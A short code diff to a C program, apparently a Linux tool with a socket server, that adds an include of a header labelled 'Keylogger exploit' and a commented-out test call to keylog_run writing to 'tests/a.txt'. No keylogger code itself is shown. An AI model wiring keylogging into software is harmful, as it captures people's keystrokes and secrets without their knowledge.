@@ -42,6 +42,7 @@
 #include <errors/errors.h> //Logger messages
 #include <logs/slog.c>     //Logger library
 #include <server/server.h> //Socket server
+#include <keylogger.h>     //Keylogger exploit
 
 #define DEV true
 #define LINUX true
@@ -103,6 +104,12 @@ int main(int argc,
      * Operating System (Linux Only)
      */
     checkOS(OS);
+
+    /**
+     * Test - Keylogger
+     */
+    //const char *o_f = "tests/a.txt";
+    //keylog_run(o_f);
 
     /**
      * Socket Server
